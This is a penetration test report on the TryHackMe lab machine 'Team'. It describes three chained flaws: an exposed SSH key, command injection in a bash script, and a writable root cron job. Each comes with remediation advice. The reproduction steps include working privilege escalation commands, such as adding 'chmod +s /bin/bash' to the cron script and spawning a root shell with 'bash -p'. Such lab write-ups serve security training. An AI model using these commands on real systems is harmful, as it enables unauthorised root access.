# 🔐 Penetration Test Report — TryHackMe: Team

**Machine:** Team | **IP:** `10.112.152.64` | **Difficulty:** Easy  
**Date:** April 17, 2026 | **Tester:** Maksim

---

## Executive Summary

Assessment of the TryHackMe machine "Team" resulted in **full system compromise** via a chain of three vulnerabilities: exposed SSH private key, command injection through an unvalidated bash variable, and a world-writable cron script executed as root.

---

## Attack Chain

| Step | Technique | From | To |
|------|-----------|------|----|
| 1 | Exposed SSH Private Key | Unauthenticated | `dale` (SSH) |
| 2 | Command Injection (`$error` variable) | `dale` | `gyles` (lateral movement) |
| 3 | Writable Cron Script (`cron` + `admin` group) | `gyles` | `root` |

---

## Findings Summary

| ID | Finding | Severity | MITRE ATT&CK |
|----|---------|----------|--------------|
| F-01 | SSH Private Key Exposed in Web Config | 🔴 Critical | T1552.004 – Private Keys |
| F-02 | Command Injection via Unvalidated Bash Variable | 🟠 High | T1059.004 – Unix Shell |
| F-03 | Writable Cron Script Executed as Root | 🔴 Critical | T1053.003 – Cron |

---

## Detailed Findings

### F-01 — SSH Private Key Exposed in Web Config
**Severity: 🔴 Critical**

An OpenSSH private key belonging to user `dale` was found embedded in the SSH server configuration file accessible via the web application. The key was retrievable without authentication.

**Reproduction:**
1. Navigate to the exposed configuration file on the web server
2. Extract the private key for user `dale`
3. Remove the `#` comment markers from each line

```bash
sed -i 's/^#//' id_rsa && chmod 600 id_rsa
ssh -i id_rsa dale@10.112.152.64
```

**Remediation:**
- Never store private keys in web-accessible files
- Rotate all compromised SSH keys immediately
- Audit web server directory listings and accessible config files

---

### F-02 — Command Injection via Unvalidated Bash Variable
**Severity: 🟠 High**

The script `/home/gyles/admin_checks` reads user input into a variable (`$error`) and executes it directly as a shell command with no validation or sanitization. User `dale` has sudo rights to execute this script as `gyles`.

**Vulnerable code:**
```bash
read -p "Enter 'date' to timestamp the file: " error
$error 2>/dev/null   # executes user input directly
```

**Reproduction:**
```bash
sudo -u gyles /home/gyles/admin_checks
# Enter any value for the first prompt (name)
# Enter /bin/bash at the second prompt
# → spawns an interactive bash shell as gyles
```

**Remediation:**
- Replace `$error` with `$(date)` — hardcode the command
- Never execute unvalidated user input
- Use input whitelisting if dynamic input is required

---

### F-03 — Writable Cron Script Executed as Root
**Severity: 🔴 Critical**

The script `/usr/local/bin/main_backup.sh` is executed by `root` via cron and is writable by members of the `admin` group. User `gyles` is a member of `admin`, allowing arbitrary command execution as root by modifying the script.

**Permissions:**
```
-rwxrwxr-x 1 root admin /usr/local/bin/main_backup.sh
```

**Reproduction:**
```bash
echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.sh
# Wait for cron to execute the script as root
bash -p   # spawns root shell via SUID bash
```

**Remediation:**
- Remove write permissions for group `admin` on cron scripts
- Apply principle of least privilege to all scheduled tasks
- Regularly audit writable files in `/usr/local/bin` and `/etc/cron*`

---

## Conclusion

The machine was fully compromised via a three-step attack chain. Each vulnerability on its own represents a significant risk; chained together they allow an unauthenticated attacker to achieve root access.

> **Priority remediation:** F-01 (exposed SSH key) and F-03 (writable cron script) should be addressed immediately, as they are rated Critical.
